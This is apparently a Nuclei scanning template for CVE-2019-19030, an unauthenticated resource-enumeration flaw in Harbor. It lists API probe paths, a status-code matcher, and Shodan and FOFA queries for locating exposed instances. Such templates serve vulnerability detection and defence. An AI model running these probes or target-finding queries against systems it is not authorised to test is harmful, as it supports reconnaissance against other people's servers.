id: CVE-2019-19030

info:
  name: Harbor Resource Enumeration Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: Cloud Native Computing Foundation Harbor before 1.10.3 and 2.x before 2.0.1 allows resource enumeration because unauthenticated API calls reveal (via the HTTP status code) whether a resource exists.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive information.
  remediation: |
    Apply the patch provided by Harbor to fix the enumeration vulnerability (CVE-2019-19030).
  reference:
    - https://github.com/goharbor/harbor/security/advisories/GHSA-q9x4-q76f-5h5j
    - https://github.com/shodanwashere/boatcrash
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2019-19030
    epss-score: 0.00077
    epss-percentile: 0.3474
    cpe: cpe:2.3:a:linuxfoundation:harbor:*:*:*:*:*:*:*:*
  metadata:
    vendor: linuxfoundation
    product: harbor
    shodan-query: http.favicon.hash:657337228
    fofa-query: icon_hash=657337228

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/chartrepo/{{repo}}/charts"
      - "{{BaseURL}}/api/chartrepo/{{repo}}/charts/{{name}}"
      - "{{BaseURL}}/api/chartrepo/{{repo}}/charts/{{name}}/{{version}}"
      - "{{BaseURL}}/api/labels?name={{name}}&scope=p"
      - "{{BaseURL}}/api/repositories?project_id={{id}}"
      - "{{BaseURL}}/api/repositories/{{repo_name}}/"
      - "{{BaseURL}}/api/repositories/{{repo_name}}/tags"
      - "{{BaseURL}}/api/repositories/{{repo_name}}/tags/{{tag}}/manifest?version={{version}}"
      - "{{BaseURL}}/api/projects?project_name={{name}}"
      - "{{BaseURL}}/api/projects/{{project_id}}/summary"
      - "{{BaseURL}}/api/projects/{{project_id}}/logs"
      - "{{BaseURL}}/api/projects/{{project_id}}"
      - "{{BaseURL}}/api/projects/{{project_id}}/metadatas"
      - "{{BaseURL}}/api/projects/{{project_id}}/metadatas/{{metadata_name}}"

    matchers:
      - type: status
        status:
          - 200
          - 403
          - 404
